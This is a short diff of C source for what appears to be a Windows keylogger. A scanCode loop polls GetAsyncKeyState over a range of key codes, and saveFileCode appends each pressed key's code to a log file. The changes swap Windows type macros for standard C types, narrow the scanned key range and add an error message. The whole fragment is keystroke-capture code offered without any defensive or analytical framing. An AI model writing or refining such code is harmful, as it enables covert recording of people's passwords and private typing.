@@ -1,6 +1,6 @@
 #include "keyscan.h"
 
-INT saveFileCode(INT code){
+int saveFileCode(int code){
     FILE *file = NULL;
     if((file = fopen(KEY_FILE, "a")) != NULL){
         switch(code){
@@ -350,13 +350,16 @@ INT saveFileCode(INT code){
         fclose(file);
         return EXIT_SUCCESS;
     }
+    else
+        printf("ERROR %ld\n", GetLastError());
     return EXIT_FAILURE;
 }
 
-VOID scanCode(VOID){
-    INT key;
-    for(key = 0; key < 256; ++key){
-        if(GetAsyncKeyState(key) == -32767)
+void scanCode(void){
+    int key;
+    for(key = 8; key <= 165; ++key){
+        if(GetAsyncKeyState(key) == -32767){
             saveFileCode(key);
+        }
     }
 }
